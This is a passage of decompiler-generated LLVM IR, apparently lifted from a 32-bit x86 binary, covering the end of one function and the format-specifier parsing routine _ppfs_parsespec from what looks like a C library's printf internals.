  %v1_804f134 = icmp eq i1 %v2_804f132, false
  br i1 %v1_804f134, label %dec_label_pc_804f14e, label %dec_label_pc_804f136

dec_label_pc_804f136:                             ; preds = %dec_label_pc_804f12f
  %v1_804f136 = sub i32 0, %v3_804f12f
  store i32 %v1_804f136, i32* %eax.global-to-local, align 4
  store i32 %v1_804f136, i32* %v2_804f12f, align 4
  %v0_804f13b = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f13b = add i32 %v0_804f13b, 16
  %v2_804f13b = inttoptr i32 %v1_804f13b to i32*
  %v3_804f13b = load i32, i32* %v2_804f13b, align 4
  %v1_804f13e = and i32 %v3_804f13b, -10
  %v1_804f141 = or i32 %v1_804f13e, 8
  store i32 %v1_804f141, i32* %eax.global-to-local, align 4
  store i32 %v1_804f141, i32* %v2_804f13b, align 4
  %v0_804f147 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804f147 = add i32 %v0_804f147, 20
  %v2_804f147 = inttoptr i32 %v1_804f147 to i32*
  store i32 32, i32* %v2_804f147, align 4
  %v0_804f150.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f14e

dec_label_pc_804f14e:                             ; preds = %dec_label_pc_804f12f, %dec_label_pc_804f136
  %v0_804f150 = phi i32 [ %v3_804f12f, %dec_label_pc_804f12f ], [ %v0_804f150.pre, %dec_label_pc_804f136 ]
  %v2_804f14e = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804f14e, i32* @ebx, align 4
  ret i32 %v0_804f150

; uselistorder directives
  uselistorder i32 %v1_804f141, { 1, 0 }
  uselistorder i32 %v3_804f125, { 1, 0 }
  uselistorder i32 %v3_804f10e, { 1, 0 }
  uselistorder i32 %v0_804f08b.be, { 1, 0 }
  uselistorder i32 %v1_804f0fa, { 0, 2, 1 }
  uselistorder i32 %v3_804f091, { 1, 0, 2 }
  uselistorder i32* %v2_804f091, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_804f08c, { 1, 0 }
  uselistorder i32 %v6_804f087, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v0_804f08b20, { 1, 0 }
  uselistorder i32 %v1_804f0fa21, { 0, 2, 1 }
  uselistorder i32 %v1_804f078, { 0, 1, 3, 2 }
  uselistorder i1 %v1_804f108, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 10, 9, 7, 0, 3, 4, 8, 5, 6, 11 }
  uselistorder i32 -8, { 45, 8, 9, 2, 3, 4, 5, 6, 7, 10, 11, 12, 13, 47, 20, 19, 15, 14, 16, 17, 18, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 48, 49, 46, 50, 34, 32, 33, 35, 36, 37, 31, 1, 51, 52, 53, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i32 80, { 4, 5, 6, 1, 7, 8, 9, 0, 2, 3 }
  uselistorder i32 %arg1, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder label %dec_label_pc_804f14e, { 1, 0 }
  uselistorder label %dec_label_pc_804f12f, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f118, { 1, 0 }
  uselistorder label %dec_label_pc_804f0f7, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804f0ed, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804f087, { 1, 0 }
  uselistorder label %dec_label_pc_804f083, { 1, 0 }
  uselistorder label %dec_label_pc_804f066, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804f154 = load i32, i32* @eax, align 4
  br label %dec_label_pc_804f15b

dec_label_pc_804f15b:                             ; preds = %dec_label_pc_804f15b, %entry
  %v0_804f15b = phi i32 [ ptrtoint (i8** @global_var_80513b0.129 to i32), %entry ], [ %v1_804f15b, %dec_label_pc_804f15b ]
  %v1_804f15b = add i32 %v0_804f15b, -2
  %v1_804f15e = inttoptr i32 %v1_804f15b to i16*
  %v2_804f15e = load i16, i16* %v1_804f15e, align 2
  %v3_804f15e = sext i16 %v2_804f15e to i32
  %v12_804f161 = icmp ne i32 %v3_804f15e, %v0_804f154
  %v6_804f16b = icmp ugt i32 %v1_804f15b, ptrtoint (i32* @global_var_8051398.130 to i32)
  %or.cond = and i1 %v6_804f16b, %v12_804f161
  br i1 %or.cond, label %dec_label_pc_804f15b, label %dec_label_pc_804f16d

dec_label_pc_804f16d:                             ; preds = %dec_label_pc_804f15b
  %.pre = add i32 %v0_804f15b, -134550426
  %v2_804f173 = sdiv i32 %.pre, 2
  store i32 %v2_804f173, i32* @edx, align 4
  %v1_804f175 = add i32 %v2_804f173, ptrtoint (i8** @global_var_80513b0.129 to i32)
  %v2_804f175 = inttoptr i32 %v1_804f175 to i8*
  %v3_804f175 = load i8, i8* %v2_804f175, align 1
  %v4_804f175 = zext i8 %v3_804f175 to i32
  ret i32 %v4_804f175

; uselistorder directives
  uselistorder i32 %v2_804f173, { 1, 0 }
  uselistorder i32 %v1_804f15b, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_80513b0.129 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp67 = call i32 @__decompiler_undefined_function_0()
  %tmp71 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-87 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804f17e = load i32, i32* @edi, align 4
  %v0_804f17f = load i32, i32* @esi, align 4
  %v0_804f180 = load i32, i32* @ebx, align 4
  store i32 %v0_804f180, i32* %stack_var_-16, align 4
  %v4_804f180 = ptrtoint i32* %stack_var_-16 to i32
  store i32 8, i32* %stack_var_-52, align 4
  store i32 %tmp67, i32* %eax.global-to-local, align 4
  %v1_804f1a8 = add i32 %tmp67, 24
  %v2_804f1a8 = inttoptr i32 %v1_804f1a8 to i32*
  %v3_804f1a8 = load i32, i32* %v2_804f1a8, align 4
  store i32 %v3_804f1a8, i32* %eax.global-to-local, align 4
  store i32 %tmp67, i32* %edx.global-to-local, align 4
  %v1_804f1b3 = add i32 %tmp67, 16
  %v2_804f1b3 = inttoptr i32 %v1_804f1b3 to i32*
  %v3_804f1b3 = load i32, i32* %v2_804f1b3, align 4
  %v1_804f1b6 = and i32 %v3_804f1b3, 128
  %v2_804f1b6 = icmp eq i32 %v1_804f1b6, 0
  store i32 %v1_804f1b6, i32* %ebp.global-to-local, align 4
  %v1_804f1bc = icmp eq i1 %v2_804f1b6, false
  br i1 %v1_804f1bc, label %dec_label_pc_804f1c2, label %dec_label_pc_804f1be

dec_label_pc_804f1be:                             ; preds = %entry
  %v1_804f1be = inttoptr i32 %tmp67 to i32*
  %v2_804f1be = load i32, i32* %v1_804f1be, align 4
  br label %dec_label_pc_804f1fb

dec_label_pc_804f1c2:                             ; preds = %entry
  %v15_804f181 = ptrtoint i32* %stack_var_-104 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  %v1_804f1cf = inttoptr i32 %tmp67 to i32*
  br label %dec_label_pc_804f1c4

dec_label_pc_804f1c4:                             ; preds = %dec_label_pc_804f1ec.dec_label_pc_804f1c4_crit_edge, %dec_label_pc_804f1c2
  %v2_804f1d7 = phi i32 [ %v2_804f1d7.pre, %dec_label_pc_804f1ec.dec_label_pc_804f1c4_crit_edge ], [ %v15_804f181, %dec_label_pc_804f1c2 ]
  %v2_804f1d5 = phi i32 [ %v0_804f1e8, %dec_label_pc_804f1ec.dec_label_pc_804f1c4_crit_edge ], [ %v0_804f180, %dec_label_pc_804f1c2 ]
  %v3_804f1d7 = phi i32 [ %v1_804f1ec, %dec_label_pc_804f1ec.dec_label_pc_804f1c4_crit_edge ], [ 0, %dec_label_pc_804f1c2 ]
  %v1_804f1c4 = mul i32 %v3_804f1d7, 4
  store i32 %v1_804f1c4, i32* %ecx.global-to-local, align 4
  store i32 %tmp67, i32* %eax.global-to-local, align 4
  %v2_804f1cf = load i32, i32* %v1_804f1cf, align 4
  store i32 %v2_804f1cf, i32* @edx, align 4
  %v2_804f1d1 = add i32 %v1_804f1c4, -4
  %v3_804f1d1 = add i32 %v2_804f1d1, %v2_804f1cf
  %v4_804f1d1 = inttoptr i32 %v3_804f1d1 to i32*
  %v5_804f1d1 = load i32, i32* %v4_804f1d1, align 4
  store i32 %v5_804f1d1, i32* %eax.global-to-local, align 4
  %v1_804f1d5 = urem i32 %v5_804f1d1, 256
  %v3_804f1d5 = and i32 %v2_804f1d5, -256
  %v4_804f1d5 = or i32 %v1_804f1d5, %v3_804f1d5
  store i32 %v4_804f1d5, i32* @ebx, align 4
  %v1_804f1d7 = trunc i32 %v5_804f1d1 to i8
  %v4_804f1d7 = add i32 %v2_804f1d7, 16
  %v5_804f1d7 = add i32 %v4_804f1d7, %v3_804f1d7
  %v6_804f1d7 = inttoptr i32 %v5_804f1d7 to i8*
  store i8 %v1_804f1d7, i8* %v6_804f1d7, align 1
  %v0_804f1db = load i32, i32* %eax.global-to-local, align 4
  %v1_804f1db = urem i32 %v0_804f1db, 256
  store i32 %v1_804f1db, i32* %eax.global-to-local, align 4
  %v1_804f1de = load i32, i32* %ecx.global-to-local, align 4
  %v2_804f1de = load i32, i32* @edx, align 4
  %v3_804f1de = add i32 %v1_804f1de, -4
  %v4_804f1de = add i32 %v3_804f1de, %v2_804f1de
  %v5_804f1de = inttoptr i32 %v4_804f1de to i32*
  %v6_804f1de = load i32, i32* %v5_804f1de, align 4
  %v17_804f1de = icmp eq i32 %v1_804f1db, %v6_804f1de
  %v1_804f1e2 = icmp eq i1 %v17_804f1de, false
  br i1 %v1_804f1e2, label %dec_label_pc_804f581, label %dec_label_pc_804f1e8

dec_label_pc_804f1e8:                             ; preds = %dec_label_pc_804f1c4
  %v0_804f1e8 = load i32, i32* @ebx, align 4
  %v3_804f1e8 = trunc i32 %v0_804f1e8 to i8
  %v4_804f1e8 = icmp eq i8 %v3_804f1e8, 0
  br i1 %v4_804f1e8, label %dec_label_pc_804f1f2, label %dec_label_pc_804f1ec

dec_label_pc_804f1ec:                             ; preds = %dec_label_pc_804f1e8
  %v0_804f1ec = load i32, i32* %esi.global-to-local, align 4
  %v1_804f1ec = add i32 %v0_804f1ec, 1
  store i32 %v1_804f1ec, i32* %esi.global-to-local, align 4
  %tmp155 = icmp ult i32 %v1_804f1ec, 32
  br i1 %tmp155, label %dec_label_pc_804f1ec.dec_label_pc_804f1c4_crit_edge, label %dec_label_pc_804f1f2

dec_label_pc_804f1ec.dec_label_pc_804f1c4_crit_edge: ; preds = %dec_label_pc_804f1ec
  %v2_804f1d7.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804f1c4

dec_label_pc_804f1f2:                             ; preds = %dec_label_pc_804f1ec, %dec_label_pc_804f1e8
  %v2_804f1f7 = ptrtoint i32* %stack_var_-87 to i32
  br label %dec_label_pc_804f1fb

dec_label_pc_804f1fb:                             ; preds = %dec_label_pc_804f1be, %dec_label_pc_804f1f2
  %storemerge = phi i32 [ %v2_804f1be, %dec_label_pc_804f1be ], [ %v2_804f1f7, %dec_label_pc_804f1f2 ]
  store i32 %storemerge, i32* @edx, align 4
  store i32 0, i32* %stack_var_-104, align 4
  br label %dec_label_pc_804f20e

dec_label_pc_804f20c:                             ; preds = %dec_label_pc_804f2dd, %dec_label_pc_804f339
  %stack_var_-20.0 = phi i32 [ %stack_var_-20.3, %dec_label_pc_804f339 ], [ %stack_var_-20.2, %dec_label_pc_804f2dd ]
  %v0_804f20c = phi i32 [ %v1_804f339, %dec_label_pc_804f339 ], [ %v0_804f2ea, %dec_label_pc_804f2dd ]
  %stack_var_-100.0 = phi i64 [ -1, %dec_label_pc_804f339 ], [ %stack_var_-100.1, %dec_label_pc_804f2dd ]
  %stack_var_-96.0 = phi i32 [ %stack_var_-96.3, %dec_label_pc_804f339 ], [ %stack_var_-96.2, %dec_label_pc_804f2dd ]
  store i32 %v0_804f20c, i32* @edx, align 4
  br label %dec_label_pc_804f20e

dec_label_pc_804f20e:                             ; preds = %dec_label_pc_804f1fb, %dec_label_pc_804f20c
  %stack_var_-20.1 = phi i32 [ %tmp71, %dec_label_pc_804f1fb ], [ %stack_var_-20.0, %dec_label_pc_804f20c ]
  %v0_804f20e = phi i32 [ %storemerge, %dec_label_pc_804f1fb ], [ %v0_804f20c, %dec_label_pc_804f20c ]
  %stack_var_-100.1 = phi i64 [ 0, %dec_label_pc_804f1fb ], [ %stack_var_-100.0, %dec_label_pc_804f20c ]
  %stack_var_-96.1 = phi i32 [ %v3_804f1a8, %dec_label_pc_804f1fb ], [ %stack_var_-96.0, %dec_label_pc_804f20c ]
  store i32 %v0_804f20e, i32* @esi, align 4
  %v1_804f210 = inttoptr i32 %v0_804f20e to i8*
  %v2_804f210 = load i8, i8* %v1_804f210, align 1
  %v11_804f210 = icmp eq i8 %v2_804f210, 42
  %v1_804f213 = icmp eq i1 %v11_804f210, false
  br i1 %v1_804f213, label %dec_label_pc_804f225, label %dec_label_pc_804f215

dec_label_pc_804f215:                             ; preds = %dec_label_pc_804f20e
  %v7_804f215 = mul nsw i64 %stack_var_-100.1, -4
  %v8_804f215 = trunc i64 %v7_804f215 to i32
  store i32 %v8_804f215, i32* %eax.global-to-local, align 4
  %v0_804f21a = load i32, i32* @esp, align 4
  %v2_804f21a = add i32 %v8_804f215, 48
  %v3_804f21a = add i32 %v2_804f21a, %v0_804f21a
  %v4_804f21a = inttoptr i32 %v3_804f21a to i32*
  store i32 0, i32* %v4_804f21a, align 4
  %v0_804f222 = load i32, i32* @edx, align 4
  %v1_804f222 = add i32 %v0_804f222, 1
  store i32 %v1_804f222, i32* @esi, align 4
  br label %dec_label_pc_804f225

dec_label_pc_804f225:                             ; preds = %dec_label_pc_804f20e, %dec_label_pc_804f215
  %v0_804f24d28 = phi i32 [ %v0_804f20e, %dec_label_pc_804f20e ], [ %v1_804f222, %dec_label_pc_804f215 ]
  %v0_804f2af = phi i32 [ %v0_804f20e, %dec_label_pc_804f20e ], [ %v0_804f222, %dec_label_pc_804f215 ]
  store i32 0, i32* @edi, align 4
  %v4_804f24d.pre = load i32, i32* @ebx, align 4
  %v0_804f252.pre = load i32, i32* @global_var_8053338, align 8
  %v1_804f24d109 = inttoptr i32 %v0_804f24d28 to i8*
  %v2_804f24d110 = load i8, i8* %v1_804f24d109, align 1
  %v3_804f24d111 = zext i8 %v2_804f24d110 to i32
  %v5_804f24d112 = and i32 %v4_804f24d.pre, -256
  %v6_804f24d113 = or i32 %v3_804f24d111, %v5_804f24d112
  store i32 %v6_804f24d113, i32* @ebx, align 4
  store i32 %v3_804f24d111, i32* %ecx.global-to-local, align 4
  store i32 %v0_804f252.pre, i32* %eax.global-to-local, align 4
  %v2_804f257114 = mul nuw nsw i32 %v3_804f24d111, 2
  %v3_804f257115 = add i32 %v2_804f257114, %v0_804f252.pre
  %v4_804f257116 = inttoptr i32 %v3_804f257115 to i8*
  %v5_804f257117 = load i8, i8* %v4_804f257116, align 1
  %v6_804f257118 = and i8 %v5_804f257117, 8
  %v7_804f257119 = icmp eq i8 %v6_804f257118, 0
  %v1_804f25b120 = icmp eq i1 %v7_804f257119, false
  br i1 %v1_804f25b120, label %dec_label_pc_804f229, label %dec_label_pc_804f25d

dec_label_pc_804f229:                             ; preds = %dec_label_pc_804f225, %dec_label_pc_804f24c
  %v6_804f24d125 = phi i32 [ %v6_804f24d, %dec_label_pc_804f24c ], [ %v6_804f24d113, %dec_label_pc_804f225 ]
  %v3_804f24d124 = phi i32 [ %v3_804f24d, %dec_label_pc_804f24c ], [ %v3_804f24d111, %dec_label_pc_804f225 ]
  %v2_804f24d123 = phi i8 [ %v2_804f24d, %dec_label_pc_804f24c ], [ %v2_804f24d110, %dec_label_pc_804f225 ]
  %v0_804f24c122 = phi i32 [ %v1_804f24c, %dec_label_pc_804f24c ], [ %v0_804f24d28, %dec_label_pc_804f225 ]
  %v1_804f23e121 = phi i32 [ %storemerge7, %dec_label_pc_804f24c ], [ 0, %dec_label_pc_804f225 ]
  %v1_804f229 = add i32 %v1_804f23e121, -214748363
  %v6_804f229 = sub i32 214748362, %v1_804f23e121
  %v7_804f229 = and i32 %v6_804f229, %v1_804f23e121
  %v8_804f229 = icmp slt i32 %v7_804f229, 0
  %v9_804f229 = icmp eq i32 %v1_804f229, 0
  %v10_804f229 = icmp slt i32 %v1_804f229, 0
  %v3_804f22f = icmp ne i1 %v10_804f229, %v8_804f229
  %v4_804f22f = or i1 %v9_804f229, %v3_804f22f
  br i1 %v4_804f22f, label %dec_label_pc_804f23e, label %dec_label_pc_804f231

dec_label_pc_804f231:                             ; preds = %dec_label_pc_804f229
  %v9_804f231 = icmp eq i32 %v1_804f23e121, 214748364
  %v1_804f237 = icmp eq i1 %v9_804f231, false
  br i1 %v1_804f237, label %dec_label_pc_804f24c, label %dec_label_pc_804f239

dec_label_pc_804f239:                             ; preds = %dec_label_pc_804f231
  %tmp156 = icmp ult i8 %v2_804f24d123, 56
  %tmp85 = icmp eq i1 %tmp156, false
  br i1 %tmp85, label %dec_label_pc_804f24c, label %dec_label_pc_804f23e

dec_label_pc_804f23e:                             ; preds = %dec_label_pc_804f239, %dec_label_pc_804f229
  %v3_804f23e = mul i32 %v1_804f23e121, 10
  store i32 %v3_804f23e, i32* %eax.global-to-local, align 4
  %v2_804f241 = add i32 %v3_804f23e, -48
  %v3_804f241 = add i32 %v2_804f241, %v3_804f24d124
  br label %dec_label_pc_804f24c

dec_label_pc_804f24c:                             ; preds = %dec_label_pc_804f231, %dec_label_pc_804f239, %dec_label_pc_804f23e
  %storemerge7 = phi i32 [ %v3_804f241, %dec_label_pc_804f23e ], [ 2147483647, %dec_label_pc_804f239 ], [ 2147483647, %dec_label_pc_804f231 ]
  store i32 %storemerge7, i32* @edi, align 4
  %v1_804f24c = add i32 %v0_804f24c122, 1
  store i32 %v1_804f24c, i32* @esi, align 4
  %v1_804f24d = inttoptr i32 %v1_804f24c to i8*
  %v2_804f24d = load i8, i8* %v1_804f24d, align 1
  %v3_804f24d = zext i8 %v2_804f24d to i32
  %v5_804f24d = and i32 %v6_804f24d125, -256
  %v6_804f24d = or i32 %v3_804f24d, %v5_804f24d
  store i32 %v6_804f24d, i32* @ebx, align 4
  store i32 %v3_804f24d, i32* %ecx.global-to-local, align 4
  store i32 %v0_804f252.pre, i32* %eax.global-to-local, align 4
  %v2_804f257 = mul nuw nsw i32 %v3_804f24d, 2
  %v3_804f257 = add i32 %v2_804f257, %v0_804f252.pre
  %v4_804f257 = inttoptr i32 %v3_804f257 to i8*
  %v5_804f257 = load i8, i8* %v4_804f257, align 1
  %v6_804f257 = and i8 %v5_804f257, 8
  %v7_804f257 = icmp eq i8 %v6_804f257, 0
  %v1_804f25b = icmp eq i1 %v7_804f257, false
  br i1 %v1_804f25b, label %dec_label_pc_804f229, label %dec_label_pc_804f25d

dec_label_pc_804f25d:                             ; preds = %dec_label_pc_804f24c, %dec_label_pc_804f225
  %v1_804f23e.lcssa = phi i32 [ 0, %dec_label_pc_804f225 ], [ %storemerge7, %dec_label_pc_804f24c ]
  %v0_804f24c.lcssa = phi i32 [ %v0_804f24d28, %dec_label_pc_804f225 ], [ %v1_804f24c, %dec_label_pc_804f24c ]
  %v2_804f24d.lcssa = phi i8 [ %v2_804f24d110, %dec_label_pc_804f225 ], [ %v2_804f24d, %dec_label_pc_804f24c ]
  %v1_804f25d = add i32 %v0_804f2af, -1
  %v2_804f25d = inttoptr i32 %v1_804f25d to i8*
  %v3_804f25d = load i8, i8* %v2_804f25d, align 1
  %v12_804f25d = icmp eq i8 %v3_804f25d, 37
  %v1_804f261 = icmp eq i1 %v12_804f25d, false
  br i1 %v1_804f261, label %dec_label_pc_804f2f4, label %dec_label_pc_804f267

dec_label_pc_804f267:                             ; preds = %dec_label_pc_804f25d
  %v10_804f267 = icmp eq i8 %v2_804f24d.lcssa, 36
  %v1_804f26a = icmp eq i1 %v10_804f267, false
  br i1 %v1_804f26a, label %dec_label_pc_804f29a, label %dec_label_pc_804f26c

dec_label_pc_804f26c:                             ; preds = %dec_label_pc_804f267
  %tmp86 = icmp slt i32 %v1_804f23e.lcssa, 1
  br i1 %tmp86, label %dec_label_pc_804f29a, label %dec_label_pc_804f270

dec_label_pc_804f270:                             ; preds = %dec_label_pc_804f26c
  %v1_804f270 = add i32 %v0_804f24c.lcssa, 1
  store i32 %v1_804f270, i32* @edx, align 4
  %v4_804f273 = icmp eq i32 %stack_var_-96.1, 0
  br i1 %v4_804f273, label %dec_label_pc_804f581, label %dec_label_pc_804f27e

dec_label_pc_804f27e:                             ; preds = %dec_label_pc_804f270
  %v5_804f282 = sub i32 %v1_804f23e.lcssa, %stack_var_-96.1
  %v11_804f282 = xor i32 %v1_804f23e.lcssa, %stack_var_-96.1
  %v12_804f282 = xor i32 %v5_804f282, %v1_804f23e.lcssa
  %v13_804f282 = and i32 %v12_804f282, %v11_804f282
  %v14_804f282 = icmp slt i32 %v13_804f282, 0
  %v15_804f282 = icmp eq i32 %v5_804f282, 0
  %v16_804f282 = icmp slt i32 %v5_804f282, 0
  %v3_804f286 = icmp ne i1 %v16_804f282, %v14_804f282
  %v4_804f286 = or i1 %v15_804f282, %v3_804f286
  %stack_var_-96.1.v0_804f288 = select i1 %v4_804f286, i32 %stack_var_-96.1, i32 %v1_804f23e.lcssa
  br label %dec_label_pc_804f296

dec_label_pc_804f296:                             ; preds = %dec_label_pc_804f2ab, %dec_label_pc_804f27e, %dec_label_pc_804f2af
  %stack_var_-20.2 = phi i32 [ %stack_var_-20.1, %dec_label_pc_804f2ab ], [ %stack_var_-20.1, %dec_label_pc_804f2af ], [ %v1_804f23e.lcssa, %dec_label_pc_804f27e ]
  %v0_804f296 = phi i32 [ %v0_804f2af, %dec_label_pc_804f2ab ], [ %v0_804f2af, %dec_label_pc_804f2af ], [ %v1_804f270, %dec_label_pc_804f27e ]
  %stack_var_-96.2 = phi i32 [ 0, %dec_label_pc_804f2ab ], [ 0, %dec_label_pc_804f2af ], [ %stack_var_-96.1.v0_804f288, %dec_label_pc_804f27e ]
  store i32 %v0_804f296, i32* @esi, align 4
  br label %dec_label_pc_804f2be

dec_label_pc_804f29a:                             ; preds = %dec_label_pc_804f26c, %dec_label_pc_804f267
  %tmp87 = icmp slt i32 %stack_var_-96.1, 1
  br i1 %tmp87, label %dec_label_pc_804f2ab, label %dec_label_pc_804f2a1

dec_label_pc_804f2a1:                             ; preds = %dec_label_pc_804f29a
  %v10_804f2a1 = icmp eq i8 %v2_804f24d.lcssa, 109
  br i1 %v10_804f2a1, label %dec_label_pc_804f2f4, label %dec_label_pc_804f581

dec_label_pc_804f2ab:                             ; preds = %dec_label_pc_804f29a
  %tmp157 = icmp ugt i32 %v0_804f24c.lcssa, %v0_804f2af
  br i1 %tmp157, label %dec_label_pc_804f2af, label %dec_label_pc_804f296

dec_label_pc_804f2af:                             ; preds = %dec_label_pc_804f2ab
  %v1_804f2af = inttoptr i32 %v0_804f2af to i8*
  %v2_804f2af = load i8, i8* %v1_804f2af, align 1
  %v8_804f2af = icmp eq i8 %v2_804f2af, 48
  br i1 %v8_804f2af, label %dec_label_pc_804f296, label %dec_label_pc_804f2f4

dec_label_pc_804f2be:                             ; preds = %dec_label_pc_804f2cf, %dec_label_pc_804f296
  %v0_804f2ea = phi i32 [ %v1_804f2cf, %dec_label_pc_804f2cf ], [ %v0_804f296, %dec_label_pc_804f296 ]
  %v4_804f2c835 = phi i32 [ %v6_804f2c8.lcssa, %dec_label_pc_804f2cf ], [ %v0_804f252.pre, %dec_label_pc_804f296 ]
  store i32 1, i32* %ecx.global-to-local, align 4
  %v5_804f2c8128 = and i32 %v4_804f2c835, -256
  %v6_804f2c8129 = or i32 %v5_804f2c8128, 32
  store i32 %v6_804f2c8129, i32* %eax.global-to-local, align 4
  store i32 add (i32 ptrtoint ([8 x i8]* @global_var_8051390.131 to i32), i32 1), i32* @edx, align 4
  %v1_804f2cb = inttoptr i32 %v0_804f2ea to i8*
  %v2_804f2cb130 = load i8, i8* %v1_804f2cb, align 1
  %v15_804f2cb131 = icmp eq i8 %v2_804f2cb130, 32
  %v1_804f2cd132 = icmp eq i1 %v15_804f2cb131, false
  br i1 %v1_804f2cd132, label %dec_label_pc_804f2d4, label %dec_label_pc_804f2cf

dec_label_pc_804f2cf:                             ; preds = %dec_label_pc_804f2d9, %dec_label_pc_804f2be
  %v0_804f2d9.lcssa = phi i32 [ 1, %dec_label_pc_804f2be ], [ %v2_804f2d9, %dec_label_pc_804f2d9 ]
  %v6_804f2c8.lcssa = phi i32 [ %v6_804f2c8129, %dec_label_pc_804f2be ], [ %v6_804f2c8, %dec_label_pc_804f2d9 ]
  %v1_804f2cf = add i32 %v0_804f2ea, 1
  store i32 %v1_804f2cf, i32* @esi, align 4
  %v0_804f2d0 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804f2d0 = or i32 %v0_804f2d0, %v0_804f2d9.lcssa
  store i32 %v2_804f2d0, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804f2be

dec_label_pc_804f2d4:                             ; preds = %dec_label_pc_804f2be, %dec_label_pc_804f2d9
  %v1_804f2ca135 = phi i32 [ %v1_804f2ca, %dec_label_pc_804f2d9 ], [ add (i32 ptrtoint ([8 x i8]* @global_var_8051390.131 to i32), i32 1), %dec_label_pc_804f2be ]
  %v6_804f2c8134 = phi i32 [ %v6_804f2c8, %dec_label_pc_804f2d9 ], [ %v6_804f2c8129, %dec_label_pc_804f2be ]
  %v0_804f2d9133 = phi i32 [ %v2_804f2d9, %dec_label_pc_804f2d9 ], [ 1, %dec_label_pc_804f2be ]
  %v1_804f2d4 = inttoptr i32 %v1_804f2ca135 to i8*
  %v2_804f2d4 = load i8, i8* %v1_804f2d4, align 1
  %v3_804f2d4 = icmp eq i8 %v2_804f2d4, 0
  br i1 %v3_804f2d4, label %dec_label_pc_804f2dd, label %dec_label_pc_804f2d9

dec_label_pc_804f2d9:                             ; preds = %dec_label_pc_804f2d4
  %v2_804f2d9 = mul i32 %v0_804f2d9133, 2
  store i32 %v2_804f2d9, i32* %ecx.global-to-local, align 4
  %v2_804f2c8 = load i8, i8* %v1_804f2d4, align 1
  %v3_804f2c8 = zext i8 %v2_804f2c8 to i32
  %v5_804f2c8 = and i32 %v6_804f2c8134, -256
  %v6_804f2c8 = or i32 %v3_804f2c8, %v5_804f2c8
  store i32 %v6_804f2c8, i32* %eax.global-to-local, align 4
  %v1_804f2ca = add i32 %v1_804f2ca135, 1
  store i32 %v1_804f2ca, i32* @edx, align 4
  %v2_804f2cb = load i8, i8* %v1_804f2cb, align 1
  %v15_804f2cb = icmp eq i8 %v2_804f2cb, %v2_804f2c8
  %v1_804f2cd = icmp eq i1 %v15_804f2cb, false
  br i1 %v1_804f2cd, label %dec_label_pc_804f2d4, label %dec_label_pc_804f2cf

dec_label_pc_804f2dd:                             ; preds = %dec_label_pc_804f2d4
  %v0_804f2dd = load i32, i32* %ebp.global-to-local, align 4
  %v1_804f2df = udiv i32 %v0_804f2dd, 2
  %v1_804f2df.not = or i32 %v1_804f2df, -6
  %v1_804f2e4 = xor i32 %v1_804f2df.not, 5
  store i32 %v1_804f2e4, i32* %eax.global-to-local, align 4
  %v2_804f2e6 = and i32 %v1_804f2e4, %v0_804f2dd
  store i32 %v2_804f2e6, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @edi, align 4
  %v1_804f2ea = add i32 %v0_804f2ea, -1
  %v2_804f2ea = inttoptr i32 %v1_804f2ea to i8*
  %v3_804f2ea = load i8, i8* %v2_804f2ea, align 1
  %v12_804f2ea = icmp eq i8 %v3_804f2ea, 37
  %v1_804f2ee = icmp eq i1 %v12_804f2ea, false
  br i1 %v1_804f2ee, label %dec_label_pc_804f20c, label %dec_label_pc_804f2f4

dec_label_pc_804f2f4:                             ; preds = %dec_label_pc_804f2af, %dec_label_pc_804f2dd, %dec_label_pc_804f2a1, %dec_label_pc_804f25d
  %stack_var_-20.3 = phi i32 [ %stack_var_-20.1, %dec_label_pc_804f25d ], [ %stack_var_-20.2, %dec_label_pc_804f2dd ], [ %stack_var_-20.1, %dec_label_pc_804f2af ], [ %stack_var_-20.1, %dec_label_pc_804f2a1 ]
  %v0_804f317 = phi i32 [ %v1_804f23e.lcssa, %dec_label_pc_804f25d ], [ 0, %dec_label_pc_804f2dd ], [ %v1_804f23e.lcssa, %dec_label_pc_804f2af ], [ %v1_804f23e.lcssa, %dec_label_pc_804f2a1 ]
  %v1_804f320 = phi i32 [ %v0_804f24c.lcssa, %dec_label_pc_804f25d ], [ %v0_804f2ea, %dec_label_pc_804f2dd ], [ %v0_804f24c.lcssa, %dec_label_pc_804f2af ], [ %v0_804f24c.lcssa, %dec_label_pc_804f2a1 ]
  %v0_804f31d = phi i32 [ %v0_804f2af, %dec_label_pc_804f25d ], [ %v1_804f2ca135, %dec_label_pc_804f2dd ], [ %v0_804f2af, %dec_label_pc_804f2af ], [ %v0_804f2af, %dec_label_pc_804f2a1 ]
